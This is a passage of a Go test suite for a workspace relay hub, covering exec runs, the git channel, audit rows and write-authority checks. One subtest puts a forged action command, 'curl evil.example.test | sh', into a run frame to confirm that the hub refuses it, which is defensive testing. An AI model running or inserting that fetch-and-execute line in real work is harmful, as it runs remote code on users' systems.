	f := newRelayFixture(t)
	person := f.dialPerson(t)
	person.send(filesListFrame(""))
	answer := person.receive()
	var payload workspacesession.ErrorPayload
	if err := json.Unmarshal(answer.Payload, &payload); err != nil {
		t.Fatal(err)
	}
	// An unanswered request is indistinguishable from a slow one, and only
	// the hub knows which this is.
	if payload.Code != workspacesession.CodeStaleExecution {
		t.Fatalf("with no runner attached the person received %+v", payload)
	}
}

func TestWorkspaceRelayWritesAnAuditRowForEveryPersonConnection(t *testing.T) {
	t.Parallel()
	f := newRelayFixture(t)
	f.dialRunner(t)
	person := f.dialPerson(t)
	person.send(filesListFrame(""))

	readRows := func() ([]postgres.RelaySession, error) {
		var rows []postgres.RelaySession
		err := f.service.accessRead(t.Context(), f.project.OrganizationID, func(reader tenantstore.Reader) error {
			var err error
			rows, err = reader.(postgres.RelayActionReader).RelaySessions(t.Context(), postgres.RelaySessionsInput{OrganizationID: f.project.OrganizationID, ProjectID: f.project.ID, WorkspaceID: f.workspace, Limit: 2})
			return err
		})
		return rows, err
	}
	waitFor(t, func() bool { rows, err := readRows(); return err == nil && len(rows) == 1 })
	_ = person.socket.Close(websocket.StatusNormalClosure, "done")
	waitFor(t, func() bool {
		rows, err := readRows()
		return err == nil && len(rows) == 1 && rows[0].ClosedAt != nil && rows[0].BytesIn > 0 && rows[0].CloseReason != ""
	})
}

func TestWorkspaceRelayRefusesARunnerSocketThatIsNotTheWorkspacesOwner(t *testing.T) {
	t.Parallel()
	f := newRelayFixture(t)
	url := f.socketURL(f.base + "/workspaces/" + f.workspace + "/worker/relay")
	ctx := testenv.WaitContext(t, t.Context())
	refused, response, err := websocket.Dial(ctx, url, &websocket.DialOptions{HTTPHeader: http.Header{
		"Authorization":          {"Bearer " + f.runner.redemption.Credential},
		"X-Detent-Lease":         {string(f.lease.ID)},
		"X-Detent-Fencing-Token": {strconv.FormatInt(int64(f.lease.FencingToken)+1, 10)},
	}})
	closeRelayDial(response)
	if err == nil {
		_ = refused.Close(websocket.StatusNormalClosure, "unexpected")
		t.Fatal("a stale fencing token must not open the runner relay")
	}
}

// closeRelayDial releases the upgrade response a dial hands back, refused or
// not. Leaving it open leaks the connection back to the transport pool, and a
// test that leaks one per case eventually stops proving anything about the
// server's own limits.
func closeRelayDial(response *http.Response) {
	if response == nil || response.Body == nil {
		return
	}
	response.Body.Close()
}

// The exec channel. The hub forwards it like any
// other channel and it also records it: the run's row is what a person comes
// back to after the tab is closed, and it is the only record a run nobody
// watched leaves.

// action authors one project action and returns it.
func (f *relayFixture) action(t *testing.T, name, command string) workspacesession.Action {
	t.Helper()
	response := performHubAPIRequest(t, f.service, http.MethodPost, f.base+"/actions", f.token,
		map[string]any{"idempotency_key": hubapi.NewID("actkey"), "name": name, "command": command})
	requireNativeStatus(t, response, http.StatusCreated)
	var authored workspacesession.Action
	decodeHubResponse(t, response, &authored)
	return authored
}

// queuedRun queues a run of an action on the fixture's workspace.
func (f *relayFixture) queuedRun(t *testing.T, action workspacesession.Action) string {
	t.Helper()
	response := performHubAPIRequest(t, f.service, http.MethodPost,
		f.base+"/actions/"+action.ID+"/runs", f.token,
		map[string]any{"idempotency_key": hubapi.NewID("runkey"), "workspace_id": f.workspace})
	requireNativeStatus(t, response, http.StatusAccepted)
	var receipt projectActionRunReceipt
	decodeHubResponse(t, response, &receipt)
	return receipt.RunID
}

// runRow reads a run straight from the database. The relay writes the row on
// its own goroutines, so the row is what a test has to assert on; the frames
// only prove what was forwarded.
func (f *relayFixture) runRow(t *testing.T, runID string) actionRunRecord {
	t.Helper()
	var row postgres.ActionRun
	if err := f.service.accessRead(t.Context(), f.project.OrganizationID, func(reader tenantstore.Reader) error {
		var err error
		row, err = reader.(postgres.RelayActionReader).ActionRun(t.Context(), postgres.ActionRunInput{OrganizationID: f.project.OrganizationID, ProjectID: f.project.ID, ID: runID})
		return err
	}); err != nil {
		t.Fatal(err)
	}
	run, err := f.service.actionRunRecord(t.Context(), row, true)
	if err != nil {
		t.Fatalf("read run %s: %v", runID, err)
	}
	return run
}

// execRunFrame is a person's run on the exec channel.
func execRunFrame(runID string, action workspacesession.Action) workspacesession.Frame {
	payload, err := workspacesession.Encode(workspacesession.ExecRun{
		RunID: runID, ActionID: action.ID, Command: action.Command})
	if err != nil {
		panic(err)
	}
	return workspacesession.Frame{Channel: workspacesession.ChannelExec, Type: workspacesession.TypeExecRun, Payload: payload}
}

// execOutputFrame is one span of a run's combined output.
func execOutputFrame(stream string, output workspacesession.ExecOutput) workspacesession.Frame {
	payload, err := workspacesession.Encode(output)
	if err != nil {
		panic(err)
	}
	return workspacesession.Frame{Channel: workspacesession.ChannelExec, Stream: stream,
		Type: workspacesession.TypeExecOutput, Payload: payload}
}

// execExitedFrame ends a run with an exit code.
func execExitedFrame(stream string, code int) workspacesession.Frame {
	payload, err := workspacesession.Encode(workspacesession.ExecExited{Code: code})
	if err != nil {
		panic(err)
	}
	return workspacesession.Frame{Channel: workspacesession.ChannelExec, Stream: stream,
		Type: workspacesession.TypeExecExited, Payload: payload}
}

func TestWorkspaceRelayRefusesExecWhenTheRunnerDoesNotServeIt(t *testing.T) {
	t.Parallel()
	f := newRelayFixture(t)
	f.dialRunner(t)
	person := f.dialPerson(t)

	// The default runner reports files and diff. Exec is a surface a runner
	// has to offer, so the channel is refused rather than forwarded to a
	// runner that cannot run anything.
	action := f.action(t, "Run tests", "go test ./...")
	person.send(execRunFrame(hubapi.NewID("actionrun"), action))
	if payload := errorPayload(t, person.receive()); payload.Code != workspacesession.CodeForbidden {
		t.Fatalf("exec answered %+v, want forbidden", payload)
	}
}

func TestWorkspaceRelayRefusesExecOnAReadOnlyWorkspace(t *testing.T) {
	t.Parallel()
	f := newRelayFixture(t, withReadOnlyExec)
	f.dialRunner(t)
	person := f.dialPerson(t)

	// The runner serves exec, and the workspace is still the one a model is
	// editing. A command writes into that worktree, so the channel is refused
	// whatever the runner can do.
	action := f.action(t, "Run tests", "go test ./...")
	person.send(execRunFrame(hubapi.NewID("actionrun"), action))
	if payload := errorPayload(t, person.receive()); payload.Code != workspacesession.CodeForbidden {
		t.Fatalf("exec on a read-only workspace answered %+v, want forbidden", payload)
	}
}

func TestWorkspaceRelayAnswersAnUnknownExecFrameType(t *testing.T) {
	t.Parallel()
	f := newRelayFixture(t, withExec)
	runner := f.dialRunner(t)
	person := f.dialPerson(t)

	// Exec defines one person-originated frame. Anything else is answered
	// before a stream is allocated, so a client cannot spend its whole budget
	// on typos.
	person.send(workspacesession.Frame{Channel: workspacesession.ChannelExec, Type: "input"})
	if payload := errorPayload(t, person.receive()); payload.Code != workspacesession.CodeUnknownFrame {
		t.Fatalf("an unknown exec type answered %+v, want unknown_frame", payload)
	}
	// The connection survives one bad frame, so the next legal run still
	// reaches the runner.
	action := f.action(t, "Run tests", "go test ./...")
	person.send(execRunFrame(f.queuedRun(t, action), action))
	if forwarded := runner.receive(); forwarded.Type != workspacesession.TypeExecRun {
		t.Fatalf("the connection did not survive one bad frame: %+v", forwarded)
	}
}

func TestWorkspaceRelayGivesEachExecRunItsOwnStream(t *testing.T) {
	t.Parallel()
	f := newRelayFixture(t, withExec)
	runner := f.dialRunner(t)
	person := f.dialPerson(t)
	action := f.action(t, "Run tests", "go test ./...")

	// Every run is its own process and its own seq space, exactly as every
	// terminal open is its own PTY: two runs on one stream would share one
	// sequence, and a reader could not tell whose output it was reading.
	first := f.queuedRun(t, action)
	second := f.queuedRun(t, action)
	person.send(execRunFrame(first, action))
	firstStream := runner.receive()
	person.send(execRunFrame(second, action))
	secondStream := runner.receive()
	if firstStream.Stream == "" || firstStream.Stream == secondStream.Stream {
		t.Fatalf("streams %q and %q, want two", firstStream.Stream, secondStream.Stream)
	}
	if firstStream.Seq != 1 || secondStream.Seq != 1 {
		t.Fatalf("seqs = %d and %d, want each run's own space to start at 1", firstStream.Seq, secondStream.Seq)
	}
}

func TestWorkspaceRelayRecordsAnExecRunThroughToItsExit(t *testing.T) {
	t.Parallel()
	f := newRelayFixture(t, withExec)
	runner := f.dialRunner(t)
	person := f.dialPerson(t)
	action := f.action(t, "Run tests", "go test ./...")
	run := f.queuedRun(t, action)

	person.send(execRunFrame(run, action))
	forwarded := runner.receive()
	if forwarded.Type != workspacesession.TypeExecRun || forwarded.Actor == nil {
		t.Fatalf("runner received %+v, want the run frame with the hub's actor stamp", forwarded)
	}
	// The row is claimed before the frame is forwarded, so a runner holding
	// the frame is serving a run the hub has already marked running.
	running := f.runRow(t, run)
	if running.Status != workspacesession.RunRunning || running.StartedAt == nil || running.Revision != 2 {
		t.Fatalf("run = %#v, want running with a start time at revision 2", running)
	}

	runner.send(execOutputFrame(forwarded.Stream, workspacesession.ExecOutput{Data: "ok\t"}))
	if answer := person.receive(); answer.Type != workspacesession.TypeExecOutput {
		t.Fatalf("person received %+v, want the output forwarded", answer)
	}
	// A command that writes binary to its stdout sends its spans encoded, and
	// what is stored is the bytes rather than the envelope.
	runner.send(execOutputFrame(forwarded.Stream, workspacesession.ExecOutput{
		Data: base64.StdEncoding.EncodeToString([]byte("PASS\n")), Encoding: "base64"}))
	person.receive()
	runner.send(execExitedFrame(forwarded.Stream, 0))
	person.receive()

	waitFor(t, func() bool { return f.runRow(t, run).Status == workspacesession.RunSucceeded })
	finished := f.runRow(t, run)
	if finished.ExitCode == nil || *finished.ExitCode != 0 || finished.FinishedAt == nil {
		t.Fatalf("run = %#v, want exit 0 and a finish time", finished)
	}
	if finished.Output != "ok\tPASS\n" || finished.OutputBytes != int64(len("ok\tPASS\n")) || finished.Truncated {
		t.Fatalf("run = %#v, want the interleaved output stored whole", finished)
	}
	// A run that exited carries no reason: its exit code is the whole story.
	if finished.Reason != "" {
		t.Fatalf("run = %#v, want no reason", finished)
	}
	// The receipt is the output endpoint's own path, and the bytes are there.
	body := performHubAPIRequest(t, f.service, http.MethodGet, finished.OutputArtifact, f.token, nil)
	requireNativeStatus(t, body, http.StatusOK)
	if body.Body.String() != "ok\tPASS\n" {
		t.Fatalf("output = %q", body.Body.String())
	}
}

func TestWorkspaceRelayRecordsANonZeroExitAsFailed(t *testing.T) {
	t.Parallel()
	f := newRelayFixture(t, withExec)
	runner := f.dialRunner(t)
	person := f.dialPerson(t)
	action := f.action(t, "Run tests", "go test ./...")
	run := f.queuedRun(t, action)

	person.send(execRunFrame(run, action))
	forwarded := runner.receive()
	runner.send(execOutputFrame(forwarded.Stream, workspacesession.ExecOutput{Data: "FAIL\n"}))
	person.receive()
	runner.send(execExitedFrame(forwarded.Stream, 7))
	person.receive()

	waitFor(t, func() bool { return f.runRow(t, run).Status == workspacesession.RunFailed })
	failed := f.runRow(t, run)
	if failed.ExitCode == nil || *failed.ExitCode != 7 {
		t.Fatalf("run = %#v, want exit 7", failed)
	}
	// The reason field is for a run whose outcome could not be established at
	// all, which is not this one.
	if failed.Reason != "" || failed.Output != "FAIL\n" {
		t.Fatalf("run = %#v", failed)
	}
}

func TestWorkspaceRelayTruncatesExecOutputAtTheCap(t *testing.T) {
	t.Parallel()
	f := newRelayFixture(t, withExec)
	runner := f.dialRunner(t)
	person := f.dialPerson(t)
	action := f.action(t, "Run tests", "go test ./...")
	run := f.queuedRun(t, action)

	person.send(execRunFrame(run, action))
	forwarded := runner.receive()
	span := strings.Repeat("x", workspacesession.MaxExecOutputFrameBytes)
	frames := workspacesession.MaxExecOutputBytes/len(span) + 2
	for range frames {
		runner.send(execOutputFrame(forwarded.Stream, workspacesession.ExecOutput{Data: span}))
		answer := person.receive()
		ack, err := workspacesession.Encode(workspacesession.AckPayload{Through: answer.Seq})
		if err != nil {
			t.Fatal(err)
		}
		// Acknowledging keeps the relay's own replay buffer from overflowing.
		// That is a separate cap from the run's stored output, and this test is
		// about the second one.
		person.send(workspacesession.Frame{Channel: workspacesession.ChannelExec, Stream: forwarded.Stream,
			Type: workspacesession.TypeAck, Payload: ack})
	}
	runner.send(execExitedFrame(forwarded.Stream, 0))

	waitFor(t, func() bool { return workspacesession.TerminalRunStatus(f.runRow(t, run).Status) })
	capped := f.runRow(t, run)
	if capped.OutputBytes != workspacesession.MaxExecOutputBytes || len(capped.Output) != workspacesession.MaxExecOutputBytes {
		t.Fatalf("stored %d bytes, want exactly %d", capped.OutputBytes, workspacesession.MaxExecOutputBytes)
	}
	// A reader who cannot tell a finished log from a cut one reads the cut one
	// as finished.
	if !capped.Truncated {
		t.Fatalf("run = %#v, want truncated", capped)
	}
}

func TestWorkspaceRelayFailsARunWhenThePersonDisconnects(t *testing.T) {
	t.Parallel()
	f := newRelayFixture(t, withExec)
	runner := f.dialRunner(t)
	person := f.dialPerson(t)
	action := f.action(t, "Run tests", "go test ./...")
	run := f.queuedRun(t, action)

	person.send(execRunFrame(run, action))
	forwarded := runner.receive()
	runner.send(execOutputFrame(forwarded.Stream, workspacesession.ExecOutput{Data: "building\n"}))
	output := person.receive()
	if output.Type != workspacesession.TypeExecOutput || output.Stream != forwarded.Stream {
		t.Fatalf("person received %+v, want the run's output before closing", output)
	}
	var payload workspacesession.ExecOutput
	if err := json.Unmarshal(output.Payload, &payload); err != nil || payload.Data != "building\n" {
		t.Fatalf("output = %+v, decode error = %v, want building output before closing", payload, err)
	}

	// A run is not parked for a resume the way its stream is: a closed tab
	// must not leave a build that looks like it is still going.
	_ = person.socket.Close(websocket.StatusNormalClosure, "tab closed")
	waitFor(t, func() bool { return f.runRow(t, run).Status == workspacesession.RunFailed })
	failed := f.runRow(t, run)
	if failed.Reason != workspacesession.RunReasonStreamClosed || failed.ExitCode != nil {
		t.Fatalf("run = %#v, want stream_closed and no exit code", failed)
	}
	// The output collected before the disconnect is kept: it is the only
	// record of what the run had done.
	if failed.Output != "building\n" {
		t.Fatalf("run = %#v, want the output collected so far", failed)
	}
}

func TestWorkspaceRelayFailsARunWhenTheWorkspaceLeaseIsLost(t *testing.T) {
	t.Parallel()
	f := newRelayFixture(t, withExec)
	runner := f.dialRunner(t)
	person := f.dialPerson(t)
	action := f.action(t, "Run tests", "go test ./...")
	run := f.queuedRun(t, action)

	person.send(execRunFrame(run, action))
	forwarded := runner.receive()
	runner.send(execOutputFrame(forwarded.Stream, workspacesession.ExecOutput{Data: "half a build\n"}))
	person.receive()

	// The lease expires, the sweep fails the workspace, and the run goes with
	// it: the process was on a worktree the hub has given up on. The reason
	// separates that from a workspace somebody closed.
	f.advance(workspacesession.LeaseTTL + time.Second)
	f.service.workspaces.sweep(t.Context())
	waitFor(t, func() bool { return f.runRow(t, run).Status == workspacesession.RunFailed })
	failed := f.runRow(t, run)
	if failed.Reason != workspacesession.RunReasonLeaseLost {
		t.Fatalf("run = %#v, want lease_lost", failed)
	}
	if failed.Output != "half a build\n" {
		t.Fatalf("run = %#v, want the output collected so far", failed)
	}
}

func TestWorkspaceRelayFailsARunWhenTheRunnerConnectionIsReplaced(t *testing.T) {
	t.Parallel()
	f := newRelayFixture(t, withExec)
	runner := f.dialRunner(t)
	person := f.dialPerson(t)
	action := f.action(t, "Run tests", "go test ./...")
	run := f.queuedRun(t, action)

	person.send(execRunFrame(run, action))
	runner.receive()

	// A second runner connection replaces the first, and the process serving
	// the run was on the connection that lost the workspace. The new one was
	// never asked for that run, so nothing will ever report its exit.
	f.dialRunner(t)
	waitFor(t, func() bool { return f.runRow(t, run).Status == workspacesession.RunFailed })
	if failed := f.runRow(t, run); failed.Reason != workspacesession.RunReasonStreamClosed {
		t.Fatalf("run = %#v, want stream_closed", failed)
	}
}

func TestWorkspaceRelayRefusesARunFrameItMayNotStart(t *testing.T) {
	t.Parallel()
	f := newRelayFixture(t, withExec)
	runner := f.dialRunner(t)
	person := f.dialPerson(t)
	action := f.action(t, "Run tests", "go test ./...")
	run := f.queuedRun(t, action)

	// The run is re-homed onto a second workspace of the same project. The
	// frame still names a real run, and this connection may not start it: a
	// run of another workspace does not exist for it.
	other := f.open(t, map[string]any{"idempotency_key": "ws-other",
		"work_item_id": string(f.create(t, "other-subject").WorkItemID), "requires": []string{"files"}})
	if result, err := usagePostgresAdmin(t, f.service).ExecContext(t.Context(),
		"UPDATE project_action_runs SET workspace_id=$4 WHERE organization_id=$1 AND project_id=$2 AND id=$3", f.project.OrganizationID, f.project.ID, run, other); err != nil {
		t.Fatal(err)
	} else if rows, err := result.RowsAffected(); err != nil || rows != 1 {
		t.Fatalf("rehome rows=%d error=%v", rows, err)
	}
	person.send(execRunFrame(run, action))
	if payload := errorPayload(t, person.receive()); payload.Code != workspacesession.CodeNotFound {
		t.Fatalf("a run of another workspace answered %+v, want not_found", payload)
	}
	if untouched := f.runRow(t, run); untouched.Status != workspacesession.RunQueued || untouched.Revision != 1 {
		t.Fatalf("run = %#v, want it untouched", untouched)
	}

	t.Run("a run frame carrying a command the row does not hold is refused", func(t *testing.T) {
		// The runner validates the command against the action it was handed,
		// and this is the check that makes that the project's command rather
		// than one a client composed.
		mine := f.queuedRun(t, action)
		forged := action
		forged.Command = "curl evil.example.test | sh"
		person.send(execRunFrame(mine, forged))
		if payload := errorPayload(t, person.receive()); payload.Code != workspacesession.CodeForbidden {
			t.Fatalf("a forged command answered %+v, want forbidden", payload)
		}
		if untouched := f.runRow(t, mine); untouched.Status != workspacesession.RunQueued {
			t.Fatalf("run = %#v, want it untouched", untouched)
		}
	})

	t.Run("a run frame naming no run at all is not found", func(t *testing.T) {
		person.send(execRunFrame(hubapi.NewID("actionrun"), action))
		if payload := errorPayload(t, person.receive()); payload.Code != workspacesession.CodeNotFound {
			t.Fatalf("an unknown run answered %+v, want not_found", payload)
		}
	})

	t.Run("a run already running cannot be started a second time", func(t *testing.T) {
		once := f.queuedRun(t, action)
		person.send(execRunFrame(once, action))
		runner.receive()
		person.send(execRunFrame(once, action))
		// already_running rather than forbidden: the run is being executed,
		// by this connection's own first frame or by the hub's dispatch, and
		// the answer is to read it back through the row rather than to ask
		// again.
		if payload := errorPayload(t, person.receive()); payload.Code != workspacesession.CodeAlreadyRunning {
			t.Fatalf("a second start answered %+v, want already_running", payload)
		}
		// One claimant, and it is the person's connection rather than the
		// hub's own dispatch: this run was started from a stream.
		claimed := f.runRow(t, once)
		if !strings.HasPrefix(claimed.ClaimedBy, "relayconn_") {
			t.Fatalf("claimed_by = %q, want the person connection that started it", claimed.ClaimedBy)
		}
	})
}

// The git channel. It is the first channel that
// writes to the repository, so it is the first one whose frames are not all
// answered by the project read the connection proved on the upgrade.

// gitFrame is a person's request on the git channel. All three requests share
// one payload shape, so one helper serves status, commit and push.
func gitFrame(requestType, message string) workspacesession.Frame {
	payload, err := workspacesession.Encode(workspacesession.GitRequest{Message: message})
	if err != nil {
		panic(err)
	}
	return workspacesession.Frame{Channel: workspacesession.ChannelGit, Type: requestType, Payload: payload}
}

func TestWorkspaceRelayForwardsAGitStatusRequestAndItsAnswer(t *testing.T) {
	t.Parallel()
	f := newRelayFixture(t, withGit)
	runner := f.dialRunner(t)
	person := f.dialPerson(t)

	person.send(gitFrame(workspacesession.TypeGitStatus, ""))
	forwarded := runner.receive()
	if forwarded.Channel != workspacesession.ChannelGit || forwarded.Type != workspacesession.TypeGitStatus {
		t.Fatalf("runner received %+v", forwarded)
	}
	connection, index, err := workspacesession.ParseStreamID(forwarded.Stream)
	if err != nil || index != 1 || connection == "" {
		t.Fatalf("stream id %q: %v", forwarded.Stream, err)
	}
	if forwarded.Seq != 1 {
		t.Fatalf("runner-bound seq = %d, want 1", forwarded.Seq)
	}
	// The actor now carries the author a commit would be made as, because the
	// runner authors one as the acting person and a client that could name its
	// own author could attribute a commit to anybody.
	actor := forwarded.Actor
	if actor == nil || actor.PrincipalID == "" || actor.Subject == "" || actor.ConnectionID != connection {
		t.Fatalf("actor = %+v, want the hub's stamp for connection %q", actor, connection)
	}
	if actor.Name == "" {
		t.Fatalf("actor = %+v, want a name for the author line", actor)
	}
	// This fixture's person is an operator token, which is not a person: it
	// gets the token's name so a runner's log says which credential acted, and
	// no email, which is what makes the runner refuse a commit from it.
	if actor.Email != "" {
		t.Fatalf("actor email = %q, want none for an operator token", actor.Email)
	}

	status, err := workspacesession.Encode(workspacesession.GitStatus{
		Branch: "feat/git-channel", Remote: "origin", Upstream: true, Ahead: 1, Dirty: 2, HeadSHA: "abc123",
	})
	if err != nil {
		t.Fatal(err)
	}
	runner.send(workspacesession.Frame{Channel: workspacesession.ChannelGit, Stream: forwarded.Stream,
		Type: workspacesession.TypeGitStatus, Payload: status})
	answer := person.receive()
	if answer.Type != workspacesession.TypeGitStatus || answer.Stream != forwarded.Stream || answer.Seq != 1 {
		t.Fatalf("person received %+v", answer)
	}
	var reported workspacesession.GitStatus
	if err := json.Unmarshal(answer.Payload, &reported); err != nil {
		t.Fatal(err)
	}
	if reported.Branch != "feat/git-channel" || reported.Ahead != 1 || reported.Dirty != 2 {
		t.Fatalf("status = %+v", reported)
	}
}

// The git channel is request/response like files, so a stream-less request
// after the first is the same conversation continuing. A header that polls the
// status would otherwise spend the connection's whole stream budget on the one
// control it draws.
func TestWorkspaceRelayReusesTheGitChannelStream(t *testing.T) {
	t.Parallel()
	f := newRelayFixture(t, withGit)
	runner := f.dialRunner(t)
	person := f.dialPerson(t)

	first := ""
	for round := range workspacesession.MaxStreamsPerConnection + 1 {
		person.send(gitFrame(workspacesession.TypeGitStatus, ""))
		forwarded := runner.receive()
		if forwarded.Type != workspacesession.TypeGitStatus {
			t.Fatalf("round %d answered %+v, want the status forwarded", round+1, forwarded)
		}
		if first == "" {
			first = forwarded.Stream
		}
		if forwarded.Stream != first {
			t.Fatalf("round %d ran on stream %q, want %q", round+1, forwarded.Stream, first)
		}
		if forwarded.Seq != int64(round+1) {
			t.Fatalf("round %d had seq %d, want %d", round+1, forwarded.Seq, round+1)
		}
	}
}

// Every git frame the hub refuses on its own, with the proof that the refusal
// is the hub's: the frame never reaches the runner.
func TestWorkspaceRelayRefusesAGitFrameItMayNotForward(t *testing.T) {
	t.Parallel()
	for _, test := range []struct {
		name     string
		options  []func(*relayFixture)
		readOnly bool
		frame    workspacesession.Frame
		want     string
	}{
		{
			name: "commit on a read-only workspace", options: []func(*relayFixture){withGit}, readOnly: true,
			frame: gitFrame(workspacesession.TypeGitCommit, "Commit into a running attempt"),
			want:  workspacesession.CodeReadOnly,
		},
		{
			name: "push on a read-only workspace", options: []func(*relayFixture){withGit}, readOnly: true,
			frame: gitFrame(workspacesession.TypeGitPush, ""), want: workspacesession.CodeReadOnly,
		},
		{
			// A status is a read, so a read-only workspace answers it: the
			// header still shows the branch of the worktree the model is
			// editing.
			name: "status on a read-only workspace", options: []func(*relayFixture){withGit}, readOnly: true,
			frame: gitFrame(workspacesession.TypeGitStatus, ""), want: "",
		},
		{
			// The runner never reported the git capability, so the channel is
			// refused rather than forwarded to a runner that cannot serve it.
			name:  "status without the git capability",
			frame: gitFrame(workspacesession.TypeGitStatus, ""), want: workspacesession.CodeForbidden,
		},
		{
			name:  "commit without the git capability",
			frame: gitFrame(workspacesession.TypeGitCommit, "Commit on a worktree that is not a repository"),
			want:  workspacesession.CodeForbidden,
		},
	} {
		t.Run(test.name, func(t *testing.T) {
			t.Parallel()
			f := newRelayFixture(t, test.options...)
			if test.readOnly {
				f.markReadOnly(t)
			}
			runner := f.dialRunner(t)
			person := f.dialPerson(t)

			person.send(test.frame)
			if test.want == "" {
				if forwarded := runner.receive(); forwarded.Type != test.frame.Type {
					t.Fatalf("the runner received %+v, want %s forwarded", forwarded, test.frame.Type)
				}
				return
			}
			if payload := errorPayload(t, person.receive()); payload.Code != test.want {
				t.Fatalf("the frame answered %+v, want %s", payload, test.want)
			}
			// A refusal the hub made is a refusal the runner never saw, so the
			// next legal frame is the first thing on its socket. Asserting the
			// absence any other way would be asserting on a timeout.
			person.send(filesListFrame("."))
			if forwarded := runner.receive(); forwarded.Type != workspacesession.TypeFilesList {
				t.Fatalf("the runner received %+v before the files list", forwarded)
			}
		})
	}
}

// A git command that ran and failed is not a refusal: the request was allowed
// and git answered no. The person needs what git said rather than a paraphrase
// of it, so the stderr rides through the relay intact.
func TestWorkspaceRelayCarriesAGitFailureWithItsStderr(t *testing.T) {
	t.Parallel()
	f := newRelayFixture(t, withGit)
	runner := f.dialRunner(t)
	person := f.dialPerson(t)

	person.send(gitFrame(workspacesession.TypeGitPush, ""))
	forwarded := runner.receive()
	const stderr = "! [rejected] main -> main (fetch first)\nerror: failed to push some refs\n"
	runner.send(workspacesession.GitFailedFrame(workspacesession.ChannelGit, forwarded.Stream,
		"The push was rejected", stderr))

	payload := errorPayload(t, person.receive())
	if payload.Code != workspacesession.CodeGitFailed {
		t.Fatalf("the failure answered %+v, want git_failed", payload)
	}
	if payload.Stderr != stderr {
		t.Fatalf("stderr = %q, want %q", payload.Stderr, stderr)
	}
}

// seedHostedMember inserts the rows a hosted person principal is made of: the
// api_tokens principal every member has, the membership row with its role, and
// the project grant. It returns a person connection shaped like the one the
// upgrade builds for that member.
//
// The grant is "", "read" or "write", spelled rather than a boolean because an
// absent grant and a read-only grant are different refusals and a boolean
// cannot say which of the three a case means.
func (f *relayFixture) seedHostedMember(t *testing.T, name, role, grant string) *relayConnection {
	t.Helper()
	now := f.at()
	principal := "hosted_" + name
	subject := "user_" + name
	if err := f.service.accessWrite(t.Context(), f.project.OrganizationID, func(writer tenantstore.Writer) error {
		if err := writer.CreateAccessCredential(t.Context(), accessstore.Credential{OrganizationID: f.project.OrganizationID, ID: principal, Name: principal, Hash: apikey.HashToken(principal + string(f.project.OrganizationID)), Scope: "operator", CreatedAt: now, UpdatedAt: now, NativeOnly: true, Kind: "service", ProjectAccess: "selected"}); err != nil {
			return err
		}
		if err := writer.CreateAccessMember(t.Context(), accessstore.Member{OrganizationID: f.project.OrganizationID, UserID: subject, Email: name + "@example.test", MembershipID: "membership_" + name, Role: role, Active: true, PrincipalID: principal, CreatedAt: now, UpdatedAt: now}); err != nil {
			return err
		}
		if grant != "" {
			return writer.SetAccessProjectGrant(t.Context(), accessstore.ProjectGrant{OrganizationID: f.project.OrganizationID, UserID: subject, ProjectID: f.project.ID, CanWrite: grant == "write"})
		}
		return nil
	}); err != nil {
		t.Fatal(err)
	}
	return &relayConnection{
		ID: "relayconn_" + name, WorkspaceID: f.workspace, PrincipalID: principal,
		Subject: subject, SessionHash: "session_hash_" + name,
	}
}

// The `write` half of the relay protocol's authority list, which a git commit or push
// and an exec run need.
//
// It is driven through refuseRelayWrite against the fixture's own database rather
// than over a socket, and the reason is the fixture's person: an operator
// token, which the check permits by design because its authority is the token
// the middleware already proved on the upgrade. Reaching the hosted branch
// over a socket would mean a second hub configured as a hosted tenant -- its
// own identity provider, its own project insert, its own runner enrollment and
// its own cookie-authenticated ticket mint -- built to assert one SQL
// predicate. The predicate is what the rule is, so it is asserted directly and
// the socket path is covered by the refusals above.
func TestWorkspaceRelayGitWriteAuthority(t *testing.T) {
	t.Parallel()
	now := time.Now().UTC().Truncate(time.Microsecond)
	service := newClockedPostgresNativeService(t, Config{Clock: func() time.Time { return now }})
	first := newNativeFixture(t, service, "", "First write grant project")
	second := newNativeFixture(t, service, first.project.OrganizationID+"_second", "Second write grant project")
	relay := &workspaceService{server: service, logger: service.config.Logger}
	for _, test := range []struct {
		name      string
		role      string
		grant     string
		token     bool
		readOnly  bool
		inactive  bool
		exec      bool
		frameType string
		want      string
	}{
		{name: "member with write", role: "member", grant: "write", frameType: workspacesession.TypeGitCommit},
		{name: "inactive member with write", role: "member", grant: "write", inactive: true, frameType: workspacesession.TypeGitCommit, want: workspacesession.CodeForbidden},
		{name: "exec run with write", role: "member", grant: "write", exec: true},
		{name: "exec run with read only", role: "member", grant: "read", exec: true, want: workspacesession.CodeForbidden},
		{name: "exec run by a viewer", role: "viewer", grant: "write", exec: true, want: workspacesession.CodeForbidden},
		{name: "push with write", role: "member", grant: "write", frameType: workspacesession.TypeGitPush},
		{
			// Read on the project is enough for any stream, so the status the
			// header draws from is answered.
			name: "status with read only", role: "member", grant: "read", frameType: workspacesession.TypeGitStatus,
		},
		{
			name: "commit with read only", role: "member", grant: "read",
			frameType: workspacesession.TypeGitCommit, want: workspacesession.CodeForbidden,
		},
		{
			// requireHostedProject refuses a write to a viewer however
			// generous the grant row is, so a role demotion must not be
			// survivable by holding an old can_write row.
			name: "viewer with write", role: "viewer", grant: "write",
			frameType: workspacesession.TypeGitCommit, want: workspacesession.CodeForbidden,
		},
		{
			name: "member with no grant", role: "member",
			frameType: workspacesession.TypeGitCommit, want: workspacesession.CodeForbidden,
		},
		{
			// The token principal's bypass. It is not a hole: an operator
			// token proved the same write scope at the upgrade, and it has no
			// membership row this check could read.
			name: "operator token", token: true, frameType: workspacesession.TypeGitCommit,
		},
		{
			// Read-only is answered before the grant is read at all: the
			// workspace refuses the write whoever is asking.
			name: "owner on a read-only workspace", role: "owner", grant: "write", readOnly: true,
			frameType: workspacesession.TypeGitCommit, want: workspacesession.CodeReadOnly,
		},
	} {
		t.Run(test.name, func(t *testing.T) {
			for _, f := range []nativeFixture{first, second} {
				record := workspaceRecord{OrganizationID: f.project.OrganizationID, ProjectID: f.project.ID, ReadOnly: test.readOnly}
				connection := &relayConnection{ID: "relayconn_token"}
				if !test.token {
					subject := "user_" + strings.ReplaceAll(test.name, " ", "-")
					principal := "principal_" + subject
					if err := service.accessWrite(t.Context(), record.OrganizationID, func(w tenantstore.Writer) error {
						if err := w.CreateAccessCredential(t.Context(), accessstore.Credential{OrganizationID: record.OrganizationID, ID: principal, Name: principal, Hash: apikey.HashToken(string(record.OrganizationID) + principal), Scope: "operator", NativeOnly: true, Kind: "personal", ProjectAccess: "selected", CreatedAt: now, UpdatedAt: now}); err != nil {
							return err
						}
